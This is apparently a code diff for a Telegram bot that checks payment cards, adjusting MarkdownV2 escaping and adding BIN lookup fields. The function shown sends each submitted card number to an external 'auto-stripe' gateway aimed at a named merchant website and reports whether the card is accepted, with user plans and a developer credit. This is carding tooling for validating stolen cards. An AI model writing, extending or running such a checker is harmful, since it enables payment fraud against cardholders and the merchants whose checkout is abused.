@@ -1426,21 +1426,12 @@ def escape_markdown_v2(text: str) -> str:
 
 
 # ===== BACKGROUND CHECK =====
-import re
-import aiohttp
-from telegram.constants import ParseMode
-
-def escape_markdown_v2(text: str) -> str:
-    """Escape Telegram MarkdownV2 special characters."""
-    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
-
-
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
-    bullet_text = escape_markdown_v2("⌇")
+    bullet_text = escape_markdown_v2("[⌇]")
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
 
     try:
-        # BIN lookup
+        # BIN lookup (✅ using bin.py)
         bin_number = parts[0][:6]
         bin_details = await get_bin_info(bin_number)
 
@@ -1450,6 +1441,10 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_flag = bin_details.get("country_emoji", "")
         card_type = bin_details.get("type", "N/A")
         card_level = bin_details.get("brand", "N/A")
+        card_length = bin_details.get("length", "N/A")
+        luhn_check = bin_details.get("luhn", "N/A")
+        bank_phone = bin_details.get("bank_phone", "N/A")
+        bank_url = bin_details.get("bank_url", "N/A")
 
         # Call your main API
         api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
@@ -1489,7 +1484,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             status_text = api_status.upper()
 
         # Header + response formatting
-        header = f"═══ [ *{escape_markdown_v2(status_text)}* ] ═══"
+        header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
         formatted_response = f"_{escape_markdown_v2(api_status)}_"
 
         # Build final message
@@ -1500,11 +1495,11 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {formatted_response}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ `{escape_markdown_v2(brand)}`\n"
-            f"{bullet_link} 𝐓𝐲𝐩𝐞 ➜ `{escape_markdown_v2(card_type)}` | `{escape_markdown_v2(card_level)}`\n"
+            f"{bullet_link} 𝐓𝐲𝐩𝐞 ➜ `{escape_markdown_v2(card_type)} \\| {escape_markdown_v2(card_level)}`\n"
             f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ `{escape_markdown_v2(issuer)}`\n"
             f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ `{escape_markdown_v2(country_name)} {country_flag}`\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)} [{escape_markdown_v2(user_data.get('plan', 'Free'))}]\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan', 'Free'))}\\]\n"
             f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ [kคli liຖนxx](tg://resolve?domain=Kalinuxxx)\n"
             f"――――――――――――――――"
         )
@@ -1522,6 +1517,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             parse_mode=ParseMode.MARKDOWN_V2,
             disable_web_page_preview=True
         )
+
 
 
 
